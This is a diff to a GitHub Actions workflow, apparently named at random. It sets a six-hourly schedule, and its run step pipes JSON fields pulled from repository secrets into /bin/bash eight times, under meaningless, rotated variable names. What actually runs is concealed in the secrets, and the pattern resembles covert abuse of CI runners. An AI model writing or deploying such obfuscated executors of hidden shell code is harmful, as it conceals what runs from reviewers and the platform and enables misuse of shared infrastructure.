@@ -1,10 +1,11 @@
 name: tapewormkilt
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 5/6 * * *'
+    - cron: '40 0/6 * * *'
 
-jobs:  # 629
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +13,14 @@ jobs:  # 629
       - uses: actions/checkout@v4
       - name: tapewormkilt
         env:
-          wl3719: ${{ secrets.wl3719 }}
+          i26802: ${{ secrets.i26802 }}
         run: |
-          echo $wl3719 | jq -r .bxxue1756 | /bin/bash
-          echo $s60696 | jq -r .hi445 | /bin/bash
-          echo $rouk0599 | jq -r .ltilk764 | /bin/bash
-          echo $pfqr31334 | jq -r .w864 | /bin/bash
-          echo $eynok94473 | jq -r .rvrvr67937 | /bin/bash
-          echo $h5107 | jq -r .hpm108 | /bin/bash
-          echo $gofw45 | jq -r .rc83393 | /bin/bash
-          echo $nf8 | jq -r .rebx1 | /bin/bash
+          echo $i26802 | jq -r .gfx2159 | /bin/bash
+          echo $gjcm311 | jq -r .oaab5763 | /bin/bash
+          echo $x12 | jq -r .vwc967 | /bin/bash
+          echo $fbgr1735 | jq -r .nsx8 | /bin/bash
+          echo $xr0 | jq -r .qt22986 | /bin/bash
+          echo $ar05 | jq -r .ywm55 | /bin/bash
+          echo $n8 | jq -r .xifgp30175 | /bin/bash
+          echo $qej394 | jq -r .y3 | /bin/bash
 
